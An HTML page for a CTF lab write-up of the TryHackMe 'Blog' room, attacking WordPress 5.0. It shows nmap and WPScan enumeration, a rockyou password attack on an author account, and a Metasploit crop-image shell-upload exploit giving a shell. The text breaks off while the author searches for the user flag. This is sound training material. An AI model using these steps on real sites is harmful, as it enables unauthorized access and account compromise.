@@ -1,0 +1,392 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Blog // Antonio Ortiz</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.109.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Antonio Ortiz" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.461905bb1bfb5fe5b9233c724db5019724929afac3efc14c6b267a4f4a8c5c9a.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Blog"/>
+<meta name="twitter:description" content="Blog Billy Joel made a WordPress Blog!
+Blog, a CTF room based around exploiting a WordPress blog!
+We&rsquo;ll start by adding the machine&rsquo;s ip address to our hosts file.
+echo target-ip blog.thm &gt;&gt; /etc/hosts And then move on to some reconnaissance.
+Recon First we&rsquo;ll run an nmap scan of the target, using nmap&rsquo;s &ldquo;default&rdquo; scripts (-sC) and version scanner (-sV).
+nmap -sC -sV -T4 blog.thm Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 02:16 EST Nmap scan report for blog."/>
+
+    <meta property="og:title" content="Blog" />
+<meta property="og:description" content="Blog Billy Joel made a WordPress Blog!
+Blog, a CTF room based around exploiting a WordPress blog!
+We&rsquo;ll start by adding the machine&rsquo;s ip address to our hosts file.
+echo target-ip blog.thm &gt;&gt; /etc/hosts And then move on to some reconnaissance.
+Recon First we&rsquo;ll run an nmap scan of the target, using nmap&rsquo;s &ldquo;default&rdquo; scripts (-sC) and version scanner (-sV).
+nmap -sC -sV -T4 blog.thm Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 02:16 EST Nmap scan report for blog." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://kaycalbee.github.io/writeups/blog/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-12-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-02T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://kaycalbee.github.io/"><img class="app-header-avatar" src="/me1.jpg" alt="Antonio Ortiz" /></a>
+      <span class="app-header-title">Antonio Ortiz</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about">About</a>
+            -
+          
+          <a class="app-header-menu-item" href="/posts/">Blog</a>
+            -
+          
+          <a class="app-header-menu-item" href="/music/">Music</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+            -
+          
+          <a class="app-header-menu-item" href="/writeups/">Writeups</a>
+      </nav>
+      <p>Musician // Cyber Security Enthusiast // Designer</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/KayCalBee" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/ADOrtiz95" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Blog</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 2, 2022
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://kaycalbee.github.io/tags/ctf/">CTF</a>
+              <a class="tag" href="https://kaycalbee.github.io/tags/tryhackme/">tryhackme</a>
+              <a class="tag" href="https://kaycalbee.github.io/tags/wordpress/">WordPress</a>
+              <a class="tag" href="https://kaycalbee.github.io/tags/writeup/">Writeup</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="blog">Blog</h1>
+<figure><img src="/blog/blog.png" width="240px" height="240px"/><figcaption>
+            <p>Billy Joel made a WordPress Blog!</p>
+        </figcaption>
+</figure>
+
+<hr>
+<p><a href="http://tryhackme.com/room/blog">Blog</a>, a CTF room based around exploiting a WordPress blog!</p>
+<p>We&rsquo;ll start by adding the machine&rsquo;s ip address to our hosts file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo target-ip blog.thm &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>And then move on to some reconnaissance.</p>
+<hr>
+<h3 id="recon">Recon</h3>
+<p>First we&rsquo;ll run an nmap scan of the target, using nmap&rsquo;s &ldquo;default&rdquo; scripts (-sC) and version scanner (-sV).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -T4 blog.thm
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-05 02:16 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> blog.thm <span style="color:#f92672">(</span>10.10.1.240<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 578ada90baed3a470c05a3f7a80a8d78 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c264efabb19a1c87587c4bd50f204626 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 5af26292118ead8a9b23822dad53bc16 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-generator: WordPress 5.0
+</span></span><span style="display:flex;"><span>|_http-title: Billy Joel&amp;<span style="color:#75715e">#039;s IT Blog &amp;#8211; The IT blog</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/wp-admin/
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-os-discovery: |   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.7.6-Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: blog
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: BLOG<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   FQDN: blog
+</span></span><span style="display:flex;"><span>|_  System time: 2023-01-05T07:16:41+00:00
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span style="color:#ae81ff">000000000000</span> <span style="color:#f92672">(</span>Xerox<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-01-05T07:16:41
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   311: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 3s, deviation: 0s, median: 2s
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 21.06 seconds
+</span></span></code></pre></div><p>Thanks to the version scan, we&rsquo;ve found the answers to two questions already:</p>
+<blockquote>
+<p>What CMS is Billy using?<br>
+<em>WordPress</em></p>
+</blockquote>
+<blockquote>
+<p>What version of the above CMS was being used?<br>
+<em>5.0</em></p>
+</blockquote>
+<p>Now that we know what version of WordPress is running, we can search for known vulnerabilities.
+If we search the CVE database for &ldquo;WordPress 5.x&rdquo; it&rsquo;ll be the first result!</p>
+<ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">CVE-2019-8942</a></li>
+</ul>
+<p>And the exploit-db page for the vulnerability.</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/46662">exploit-db</a></li>
+</ul>
+<p>We&rsquo;ll need an account with author access for the exploit, so next we&rsquo;ll use a tool called WPScan to scan the blog for possible usernames.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://blog.thm --enumerate u
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_______________________________________________________________
+</span></span><span style="display:flex;"><span>         __          _______   _____
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
+</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;_ \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         WordPress Security Scanner by the WPScan Team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                         Version 3.8.22
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       Sponsored by Automattic - https://automattic.com/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_______________________________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] URL: http://blog.thm/ [10.10.1.240]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Started: Thu Jan  5 02:40:45 2023
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Interesting Finding(s):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Headers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Headers (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] robots.txt found: http://blog.thm/robots.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Interesting Entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - /wp-admin/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - /wp-admin/admin-ajax.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Robots Txt (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress readme found: http://blog.thm/readme.html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confidence: 60%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Rss Generator (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] WordPress theme in use: twentytwenty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Location: http://blog.thm/wp-content/themes/twentytwenty/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Last Updated: 2022-11-02T00:00:00.000Z
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | [!] The version is out of date, the latest version is 2.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style Name: Twenty Twenty
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Style URI: https://wordpress.org/themes/twentytwenty/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Author: the WordPress team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Author URI: https://wordpress.org/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Css Style In Homepage (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Confirmed By: Css Style In 404 Page (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Version: 1.3 (80% confidence)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | Found By: Style (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: &#39;</span>Version: 1.3<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Users <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Brute Forcing Author IDs - Time: 00:00:01 &lt;<span style="color:#f92672">======================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> / 10<span style="color:#f92672">)</span> 100.00% Time: 00:00:01
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> kwheel
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://blog.thm/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bjoel
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://blog.thm/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Karen Wheeler
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Rss Generator <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Billy Joel
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Rss Generator <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Thu Jan  <span style="color:#ae81ff">5</span> 02:40:51 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">38</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 6.858 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 143.396 KB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 163.559 MB
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:05
+</span></span></code></pre></div><p>We&rsquo;ve found a couple of author accounts: &ldquo;bjoel&rdquo; and &ldquo;kwheel&rdquo;, next we&rsquo;ll run the tool again in password cracking mode.</p>
+<p>Billy&rsquo;s password isn&rsquo;t crackable with the rockyou ( or any other) wordlist, so we&rsquo;ll try his mom&rsquo;s account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t <span style="color:#ae81ff">64</span> 
+</span></span></code></pre></div><p>About a minute and a half later, we should have Kelly&rsquo;s password.</p>
+<hr>
+<h3 id="exploitation">Exploitation</h3>
+<p>The <a href="https://www.exploit-db.com/exploits/46662">exploit</a> we found earlier is actually a Metasploit module sp we&rsquo;ll open the Metasploit console with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q
+</span></span></code></pre></div><p>The module is called &ldquo;Crop-image Shell Upload&rdquo;, we can find it by searching for &ldquo;crop-image&rdquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>search crop-image
+</span></span><span style="display:flex;"><span>use <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Before we can use the exploit, we have to set the USERNAME, PASSWORD, RHOST, and LHOST options. Once those are set, we can run the module.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set USERNAME kwheel
+</span></span><span style="display:flex;"><span>set PASSWORD *********
+</span></span><span style="display:flex;"><span>set RHOST blog.thm
+</span></span><span style="display:flex;"><span>set LHOST your-ip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>When the epxloit has finished, we can start our shell with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shell
+</span></span><span style="display:flex;"><span>script -qc /bin/bash /dev/null
+</span></span></code></pre></div><p>Now that we&rsquo;ve started our shell we can search for the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name user.txt 2&gt;/dev/null
